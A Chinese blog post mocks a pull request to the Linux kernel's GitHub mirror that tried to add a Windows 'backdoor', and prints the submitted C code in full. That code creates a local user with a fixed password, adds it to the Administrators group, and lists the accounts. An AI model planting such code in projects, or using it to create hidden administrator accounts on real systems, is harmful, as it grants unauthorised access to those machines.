---
# type: docs 
title: Linux 笑传之 windows.h
date: 2024-12-07 17:39:09+08:00
featured: false
comment: true
toc: true
reward: true
pinned: false
carousel: false
description: 关于linux仓库被推送带有windows.h的后门那些事
series:
categories: [闲聊]
tags: []
images: []
---

前些天看到了[Create usr.c by axhuoga1 · Pull Request #1086 · torvalds/linux - WaybackMachine](https://web.archive.org/web/20241129140736/https://github.com/torvalds/linux/pull/1086/files)，被*Windows.h*给看乐了，后面又看到别人的评论，居然是从[某些地方](https://www.cnblogs.com/LyShark/p/13420509.html)抄来的"后门"，令人忍俊不禁。

```c

#include <stdio.h>
#include <assert.h>
#include <windows.h> 
#include <lm.h>
#pragma comment(lib,"netapi32")
void AddUser(LPWSTR UserName, LPWSTR Password)
{
    USER_INFO_1 user;
    user.usri1_name = UserName;
    user.usri1_password = Password;
    user.usri1_priv = USER_PRIV_USER;
    user.usri1_home_dir = NULL;
    user.usri1_comment = NULL;
    user.usri1_flags = UF_SCRIPT;
    user.usri1_script_path = NULL;
    if (NetUserAdd(NULL, 1, (LPBYTE)&user, 0) == NERR_Success)
        printf("创建用户完成 \n");
    LOCALGROUP_MEMBERS_INFO_3 account;
    account.lgrmi3_domainandname = user.usri1_name;
    if (NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1) == NERR_Success)
        printf("添加到组完成 \n");
}
void EnumUser()
{
    LPUSER_INFO_0 pBuf = NULL;
    LPUSER_INFO_0 pTmpBuf;
    DWORD dwLevel = 0;
    DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;
    DWORD dwEntriesRead = 0, dwTotalEntries = 0, dwResumeHandle = 0;
    DWORD i;
    NET_API_STATUS nStatus;
    LPTSTR pszServerName = NULL;

    do
    {
        nStatus = NetUserEnum((LPCWSTR)pszServerName, dwLevel, FILTER_NORMAL_ACCOUNT,
            (LPBYTE*)&pBuf, dwPrefMaxLen, &dwEntriesRead, &dwTotalEntries, &dwResumeHandle);

        if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA))
        {
            if ((pTmpBuf = pBuf) != NULL)
            {
                for (i = 0; (i < dwEntriesRead); i++)
                {
                    assert(pTmpBuf != NULL);

                    if (pTmpBuf == NULL)
                    {
                        break;
                    }
                    wprintf(L"%s\n", pTmpBuf->usri0_name, pTmpBuf);
                    pTmpBuf++;
                }
            }
        }

        if (pBuf != NULL)
        {
            NetApiBufferFree(pBuf);
            pBuf = NULL;
        }
    } while (nStatus == ERROR_MORE_DATA);
    NetApiBufferFree(pBuf);
}

int main(int argc, char *argv[])
{
    AddUser(L"lyshark", L"123123");
    EnumUser();

    system("pause");
    return 0;
}

```

看了一下除了删除了一些注释以外，基本上和原文是一致的，甚至连创建的用户“lyshark”都是原博主的用户名。

提交者axhuoga1的[主页](https://web.archive.org/web/20241123003548/https://github.com/axhuoga1)，大部分Repo都是一些很简单的项目（猜数字小游戏，贪吃蛇），看得出来这位是真的纯真。

可惜的是他的账号在前几天就被删除了，有些遗憾，不过有人给他Archive下来了，也是蛮有意思的。
